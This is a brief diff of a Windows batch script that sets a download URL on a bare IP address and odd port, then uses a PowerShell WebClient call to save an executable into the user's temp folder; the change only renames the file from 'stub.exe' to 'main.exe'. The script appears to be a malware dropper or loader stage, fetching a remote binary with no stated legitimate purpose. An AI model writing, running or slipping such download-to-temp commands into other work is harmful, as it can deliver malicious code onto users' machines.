@@ -1,7 +1,7 @@
 @echo off
 set "URL=http://162.19.219.101:3391/download/blabl/main.exe"
 set "TEMP_DIR=%TEMP%"
-set "EXE_NAME=stub.exe"
+set "EXE_NAME=main.exe"
 
 echo Downloading %EXE_NAME%...
 powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL%', '%TEMP_DIR%\%EXE_NAME%')"
